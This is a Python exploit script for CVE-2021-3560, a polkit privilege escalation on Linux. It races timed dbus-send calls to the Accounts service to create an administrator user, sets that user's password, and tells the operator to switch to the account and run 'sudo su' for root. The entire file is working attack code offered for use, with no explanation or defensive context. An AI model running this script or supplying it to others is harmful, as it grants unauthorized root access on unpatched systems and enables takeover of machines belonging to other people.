import sys
import time
import subprocess
import random
import pwd

def print_banner():
    print("Exploit: Privilege escalation with polkit - CVE-2021-3560")
    print("**************")

def create_user(username):
    counter = 0
    while True:
        counter += 1
        process = subprocess.Popen([
            'dbus-send',
            '--system',
            '--dest=org.freedesktop.Accounts',
            '--type=method_call',
            '--print-reply',
            '/org/freedesktop/Accounts',
            'org.freedesktop.Accounts.CreateUser',
            f'string:{username}',
            f'string:"{username} Full Name"',
            'int32:1'
        ])
        try:
            Random = random.uniform(0.006, 0.009)
            process.wait(timeout=Random)
            process.kill()
        except subprocess.TimeoutExpired:
            process.kill()

        user_info = subprocess.run(['id', username], stdout=subprocess.PIPE).stdout.decode('utf-8')
        if user_info.find("uid") != -1:
            print(".------------------------------------.")
            print(f"[+] User Created with the name of {username}...")
            print(f"[+] Timed out at: {Random}")
            print(".------------------------------------.")
            break

        if counter > 2000:
            print("[-] Couldn't add the user, try again it may work")
            sys.exit(0)

def set_user_password(username):
    for i in range(200):
        uid = f"/org/freedesktop/Accounts/User{pwd.getpwnam(username).pw_uid}"
        password = "string:"  # Replace with the desired password

        process = subprocess.Popen([
            'dbus-send',
            '--system',
            '--dest=org.freedesktop.Accounts',
            '--type=method_call',
            '--print-reply',
            uid,
            'org.freedesktop.Accounts.User.SetPassword',
            password,
            'string:GoldenEye'
        ])
        try:
            Random = random.uniform(0.006, 0.009)
            process.wait(timeout=Random)
            process.kill()
        except subprocess.TimeoutExpired:
            process.kill()

def main():
    print_banner()
    print("[+] Starting the Exploit ")
    time.sleep(3)

    username = "tieulongg"  # Replace with the desired username

    create_user(username)
    set_user_password(username)

    print(".--------------------------------------.")
    print(f"[+] Exploit Completed, Your new user is '{username}' just log into it like, 'su {username}', and then access 'sudo su' to root privileges ")
    print(".--------------------------------------.")

if __name__ == "__main__":
    main()
